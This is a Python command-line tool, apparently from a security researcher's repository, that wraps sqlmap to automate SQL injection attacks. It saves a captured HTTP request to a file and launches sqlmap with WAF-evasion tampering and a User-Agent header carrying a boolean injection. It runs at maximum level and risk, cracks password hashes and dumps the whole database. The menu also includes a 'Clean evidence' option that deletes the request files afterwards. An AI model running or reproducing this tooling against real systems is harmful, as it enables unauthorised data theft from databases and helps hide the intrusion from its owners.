#!/usr/bin/env python3
# nu11secur1ty 2023–2025

import os
import sys
import time
from colorama import init, Fore, Style

init(autoreset=True)

def create_exploit_file():
    # --- IMPORTANT ---
    # Paste your complete raw HTTP POST or GET request here,
    # including method, headers, a blank line, and body exactly as needed.
    # Example:
    # POST /vulnerable/path HTTP/1.1
    # Host: target.com
    # Content-Type: application/x-www-form-urlencoded
    #
    # param1=value1&param2=value2
    payload = """Your_POST_Request_here!"""  # <-- Replace this whole string with your real HTTP request

    if payload.strip() == "" or payload.strip() == "Your_POST_Request_here!":
        print(Fore.RED + "❌ ERROR: You must replace the placeholder payload with your actual POST or GET request before running.")
        sys.exit(1)

    try:
        with open("exploit.txt", "w") as f:
            f.write(payload)
        print(Fore.CYAN + "✅ PoC exploit written to 'exploit.txt'")
        # Also copy to modules directory
        modules_dir = "modules"
        if os.path.exists(modules_dir) and os.path.isdir(modules_dir):
            with open(os.path.join(modules_dir, "exploit.txt"), "w") as f_mod:
                f_mod.write(payload)
            print(Fore.CYAN + f"✅ PoC exploit also copied to '{modules_dir}/exploit.txt'")
        else:
            print(Fore.YELLOW + f"⚠️ Modules directory '{modules_dir}' not found; skipping copy.")
    except Exception as e:
        print(Fore.RED + f"❌ Error writing file: {e}")
        sys.exit(1)

def run_sqlmap():
    print(Fore.GREEN + "\nEnter the parameter to target for SQL injection (e.g., username, id):")
    param = input(Fore.RED + "> ").strip()
    if not param:
        print(Fore.YELLOW + "⚠️ No parameter provided. Returning to menu.")
        return

    sqlmap_path = 'D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py'  # Change if needed
    exploit_file = os.path.abspath("exploit.txt")

    if not os.path.exists(exploit_file):
        print(Fore.RED + f"❌ exploit.txt not found at {exploit_file}. Please generate it first (option 1).")
        return

    cmd = (
        f'python "{sqlmap_path}" -r "{exploit_file}" -p "{param}" '
        '--tamper=space2comment '
        '--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3697127327\' or 9527=9527--" '
        '--dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 '
        '--batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
    )

    print(Fore.MAGENTA + "\n🚀 Launching sqlmap...\n")
    os.system(cmd)

def clean_up():
    deleted_any = False
    for path in ["exploit.txt", os.path.join("modules", "exploit.txt")]:
        try:
            if os.path.exists(path):
                os.remove(path)
                print(Fore.CYAN + f"🧹 '{path}' has been deleted.")
                deleted_any = True
        except Exception as e:
            print(Fore.RED + f"❌ Failed to delete '{path}': {e}")
    if not deleted_any:
        print(Fore.YELLOW + "⚠️ Nothing to clean — no exploit.txt files found.")

def run_module(path):
    if os.path.exists(path):
        os.system(f"python {path}")
    else:
        print(Fore.YELLOW + f"⚠️ Module not found: {path}")

def display_menu():
    print(Fore.BLUE + "\n===== G0BurpSQLmaPI Menu =====" + Style.RESET_ALL)
    print(Fore.GREEN + "1. Generate PoC exploit.txt")
    print("2. Start SQLi with sqlmap")
    print("3. Start G0BurpSQLmaPIURLi (module)")
    print("3.1 Start G0BurpSQLmaPIUser-Agent (module)")
    print("4. Clean evidence (delete exploit.txt files)")
    print("5. Exit" + Style.RESET_ALL)

def main():
    try:
        while True:
            display_menu()
            choice = input(Fore.YELLOW + "\nEnter your choice: ").strip()

            if choice == '1':
                create_exploit_file()
            elif choice == '2':
                run_sqlmap()
            elif choice == '3':
                run_module("modules/URLi.py")
            elif choice == '3.1':
                run_module("modules/User-Agent.py")
            elif choice == '4':
                clean_up()
            elif choice == '5':
                print(Fore.GREEN + "Exiting... Happy hunting ☠️\n")
                break
            else:
                print(Fore.RED + "❌ Invalid choice. Try again.")
            time.sleep(1)

    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted. Exiting cleanly.")
        sys.exit(0)

if __name__ == "__main__":
    main()
